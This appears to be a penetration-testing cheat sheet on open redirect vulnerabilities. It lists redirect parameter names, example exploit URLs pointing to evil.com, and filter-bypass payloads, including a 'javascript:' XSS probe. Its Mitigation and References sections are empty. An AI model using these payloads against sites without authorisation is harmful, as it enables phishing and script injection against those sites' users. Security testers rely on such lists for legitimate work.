## Open Redirection
***
1. **Description**
```
- Open redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way. An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application. 
- Open Redirect is a vulnerability in which the attacker manipulates a web page to redirect the users to unknown destinations (malicious/phishing destinations in most of cases).
```
2. Redirection Parameter
```
url
rurl
u
next
link
lnk
go
target
dest
destination
redir
redirect_uri
redirect_url
redirect
redirectUrl
r
view
loginto
image_url
return
returnTo
return_to
continue
return_path
path
/out?{payload}
?view={payload}
/login?to={payload}
```
3. Example/Exploitation
```
- /logout/google.com
- /signup?redirectUrl=https://evil.com
```
4. Bypass Method
```
//google.com
https:google.com
%2f%2fgoogle.com
\/\/google.com/
/\/google.com/
//google%E3%80%82com   (Bypass . char)
//google%00.com
?next=whitelisted.com&next=google.com
http://www.theirsite.com@yoursite.com/
http://www.yoursite.com?http://www.theirsite.com/
/redirect.php?url=javascript:prompt(1)    (xss from open redirection)
```
5. Mitigation
6. References
